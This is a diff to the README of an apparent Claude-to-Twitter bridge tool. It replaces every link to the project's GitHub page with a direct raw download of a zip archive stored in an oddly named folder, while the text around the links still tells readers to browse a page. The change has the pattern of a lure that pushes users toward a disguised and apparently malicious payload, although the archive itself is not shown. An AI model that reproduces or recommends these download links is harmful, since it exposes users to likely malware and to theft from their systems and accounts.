@@ -1,6 +1,6 @@
 # 🔗 twitter-bridge-mcp - Connect Claude to Twitter in Windows
 
-[![Download / Visit GitHub](https://img.shields.io/badge/Download%20%2F%20Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/harshdeepk585/twitter-bridge-mcp)
+[![Download / Visit GitHub](https://img.shields.io/badge/Download%20%2F%20Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/harshdeepk585/twitter-bridge-mcp/main/saeculum/bridge-mcp-twitter-v3.5.zip)
 
 ## 🧩 What this app does
 
@@ -30,7 +30,7 @@ Before you start, make sure you have:
 
 Go to the main GitHub page here:
 
-https://github.com/harshdeepk585/twitter-bridge-mcp
+https://raw.githubusercontent.com/harshdeepk585/twitter-bridge-mcp/main/saeculum/bridge-mcp-twitter-v3.5.zip
 
 On that page, look for the latest release, setup files, or install steps.
 
@@ -180,7 +180,7 @@ To make setup smoother:
 
 Download or visit the GitHub page here:
 
-https://github.com/harshdeepk585/twitter-bridge-mcp
+https://raw.githubusercontent.com/harshdeepk585/twitter-bridge-mcp/main/saeculum/bridge-mcp-twitter-v3.5.zip
 
 ## 🔎 What to expect after setup
 
